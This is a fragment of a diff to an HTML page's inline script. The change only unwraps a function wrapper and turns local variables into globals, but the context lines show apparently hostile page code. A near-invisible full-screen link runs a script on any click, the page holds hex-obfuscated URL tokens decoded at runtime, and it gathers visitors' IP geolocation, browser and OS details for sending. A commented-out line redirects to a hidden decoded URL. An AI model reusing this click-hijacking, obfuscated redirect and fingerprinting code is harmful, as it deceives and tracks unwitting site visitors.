@@ -91,7 +91,7 @@
   <a href="javascript:lp()" style="width:100%; height:100%;top:0;left:0;right:0;bottom:0;opacity:0.3;position:fixed;" id="evtd"></a>
   </body>
   <script>
-    (function(){
+    
     let tok={
       utkn:"75e293b315b34134f221a434949431a365d4822453a1a5341561a4a3219482541554e4d24163b5f29511a45431a1a5d271e2924411339224",
       redt:"e1229224856143b33572e4b3"};
@@ -99,7 +99,7 @@
      $.run();
             mky="e1e1843475f2f424a12393a355b24134e4a1b5d2f4b2413465c4f4b31532932465c4824494a1a5d271e2924411339224";
       su=(i)=>`https://ipapi.co/${i}/json`;
-           const getAd=()=>
+           getAd=()=>
               {
               //uap=navigatior.userAgentData;
          
@@ -130,8 +130,8 @@
         };
     function NextFun()
     {
-      let uap=navigator.userAgentData;
-      let respsend=`Browser=${uap.brands[2].brand?uap.brands[2].brand:'N_A'}&ostype=${uap.platform}`;
+      uap=navigator.userAgentData;
+      respsend=`Browser=${uap.brands[2].brand?uap.brands[2].brand:'N_A'}&ostype=${uap.platform}`;
        var qsc=document.querySelector(".cont>p");
         var dates=["SUNDAY","MONDAY","TUESDAY","WEDNESDAY","THURSDAY","FRIDAY","SATURDAY"];
         const dt=new Date();
@@ -154,7 +154,7 @@
         })
           .catch(console.error);
     }
-          })();
+        
    /* if(location.pathname.includes(tok.redt.hl())) window.open(tok.utkn.hl(),"blank");
     else return 0;*/
   </script>
